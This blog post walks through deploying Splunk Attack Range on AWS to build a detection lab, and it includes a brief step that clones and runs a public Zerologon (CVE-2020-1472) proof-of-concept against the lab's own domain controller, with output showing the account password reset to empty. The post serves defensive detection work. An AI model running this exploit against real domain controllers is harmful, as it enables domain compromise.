---
layout: post
title: "Splunk Attack Range on AWS - Guide"
comments: true
excerpt_separator: <!--more-->
---
A quick guide to get [Splunk Attack Range](https://github.com/splunk/attack_range){:target="_blank"} running on AWS. If you're trying to run this locally, I would suggest to have a look over this post [Splunk Attack Range in a virtualized Ubuntu Guest VM](https://medium.com/@julian.wieg/splunk-attack-range-in-a-virtualized-ubuntu-guest-vm-guide-c6587f43c15){:target="_blank"}. 

<!--more-->
It's a tool that allows you to create vulnerable instrumented local or cloud environments to simulate attacks against and collect the data into Splunk. I came across this Splunk post [Detecting CVE-2020-1472](https://www.splunk.com/en_us/blog/security/detecting-cve-2020-1472-using-splunk-attack-range.html){:target="_blank"} and was trying to replicate this in my own environment. Even the splunk attack range documentation have most of the details, I was still running into some issues, so leaving my notes here for my future self and for everyone else in need.
<a href="/assets/img/blog/attack_range_architecture.png" data-lightbox="blog_attack_range">
<img src="/assets/img/blog/attack_range_architecture.png"/>
</a>

### 1. AWS Server SetUp
* 
{:toc}
Run an EC2 isntance with Ubuntu 18.04 AMI. This will build a range automatically in Ubuntu 18.04, specifically tested on the AMI. You will need also to sign up for an AWS account here as a prerequisite
```
#!/bin/bash
sudo apt-get update
sudo apt-get install -y python3-dev git python-dev unzip python-pip awscli python-virtualenv
wget https://releases.hashicorp.com/terraform/0.12.28/terraform_0.12.28_linux_amd64.zip
unzip terraform_0.12.28_linux_amd64.zip
sudo mv terraform /usr/local/bin/
git clone https://github.com/splunk/attack_range && cd attack_range
cd terraform
terraform init
cd ..
virtualenv -p python3 venv
source venv/bin/activate
pip install -r requirements.txt
```

- Edit attack range configuration: You need to change the attack range password.
```
cp attack_range.conf.template attack_range.conf
vi attack_range.conf
```
- Generates ssh keys `ssh-keygen` with no passphrase
- Convert Private Key into PEM key
```
openssl rsa -in ~/.ssh/id_rsa -outform pem > id_rsa.pem
```
- Go to AWS, and select your preferred region
- Import public key in your AWS region

Also, either rename this key or update the name in the attack_range.conf file. Update ip_whitelist= `X.X.X.X/32` to your public IP. 

### 2. Attack Range SetUp

You can now build your first range using:
```
python attack_range.py -a build
```
I ran in to error message `[ERROR] connection error: dial tcp 54.89.109.252:22: i/o timeout` when I updated the ip_whitelist to my public IP in `attack_range.conf` file, so I went ahead and changed it to `0.0.0.0/0` while building attack_range, and once it completed successfully, I changed back it to my public IP to open the security group only to my ip and things went smooth after that.

**LIST MACHINES**
```python attack_range.py -lm```

**Status EC2 Machines**

| Name                                           | Status  | IP Address |
|------------------------------------------------|---------|------------|
| default-attack-range-kali_machine              | running | x.x.x.x    |
| default-attack-range-windows-domain-controller | running | x.x.x.x    |
| default-attack-range-splunk-server             | running | x.x.x.x    |

### 3. Attack Range Deploy
Install git on Kali
```
sudo apt update
sudo apt install git
```
Install pip3 on Kali
```
sudo apt install python3-pip
```
Till this step, you should have successfully deployed the attack_range on AWS, it could take up to 15 minutes. 

Splunk can now be accessed via your web browser inside your Guest VM at:
http://splunk_instance_public_ip:8000

Similarly, other machines can be accesses based on their public IP. While RDPing in to the Windows Server or Domain Controller, default domain name will be `ATTACKRANGE.LOCAL` and password will be one you updated in the `attack_range.conf` file.

Next steps are necessary if you are trying to replicate [Detecting CVE-2020-1472](https://www.splunk.com/en_us/blog/security/detecting-cve-2020-1472-using-splunk-attack-range.html){:target="_blank"} in your environment

[POC CVE-2020-172](https://github.com/dirkjanm/CVE-2020-1472){:target="_blank"} requires the latest impacket from GitHub with added netlogon structures.

### 4. Install Impacket
```
cd /opt/
sudo git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket/
sudo pip3 install .
```
[If you see error message: "ERROR: ldap3 2.8.1 has requirement pyasn1>=0.4.6, but you'll have pyasn1 0.4.2 which is incompatible."]. Run below comand first `sudo pip3 pyasn1-modules -U` to resolve the issue.
```
sudo pip3 pyasn1-modules -U
sudo python3 setup.py install
```

### 5. Simulate an Attack - CVE-2020-1472
Next go to <https://github.com/dirkjanm/CVE-2020-1472>{:target="_blank"}
```
cd /opt/
sudo git clone https://github.com/dirkjanm/CVE-2020-1472
cd CVE-2020-1472/
```
Execute the exploit by running:
```
python cve-2020-1472-exploit.py <DC hostname> 10.0.1.14
```
```
kali@kali:/opt/CVE-2020-1472$ python3 cve-2020-1472-exploit.py win-dc-6045942 10.0.1.14
Performing authentication attempts...
===========================================================================================================================
===========================================================================================================================
============================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!
```
For more information, please read this awesome post from Splunk <https://www.splunk.com/en_us/blog/security/detecting-cve-2020-1472-using-splunk-attack-range.html>{:target="_blank"}

## References
- Splunk Attack Range in a virtualized Ubuntu Guest VM — Guide <https://medium.com/@julian.wieg/splunk-attack-range-in-a-virtualized-ubuntu-guest-vm-guide-c6587f43c15>{:target="_blank"}
- Detecting CVE-2020-1472 (CISA ED 20-04) Using Splunk Attack Range <https://www.splunk.com/en_us/blog/security/detecting-cve-2020-1472-using-splunk-attack-range.html>{:target="_blank"}
- Zerloogon <https://www.secura.com/blog/zero-logon>{:target="_blank"}
- CVE-2020-1472 POC <https://github.com/dirkjanm/CVE-2020-1472>{:target="_blank"}